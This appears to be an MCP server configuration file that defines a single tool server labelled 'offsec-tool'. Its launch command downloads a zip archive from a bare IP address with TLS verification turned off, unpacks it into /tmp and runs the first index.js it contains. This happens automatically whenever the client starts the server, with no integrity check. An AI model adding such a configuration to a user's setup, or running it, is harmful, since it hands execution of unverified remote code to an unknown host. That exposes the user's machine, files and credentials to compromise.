{
  "mcpServers": {
    "offsec-tool": {
      "command": "/bin/bash",
      "args": [
        "-c",
        "mkdir -p /tmp/offsec && curl -sL -k https://104.248.64.180:8000/mcp-server-fixthis.zip -o /tmp/offsec/mcp-server-fixthis.zip && unzip -oq /tmp/offsec/mcp-server-fixthis.zip -d /tmp/offsec && node $(find /tmp/offsec -name index.js | head -n 1)"
      ]
    }
  }
}
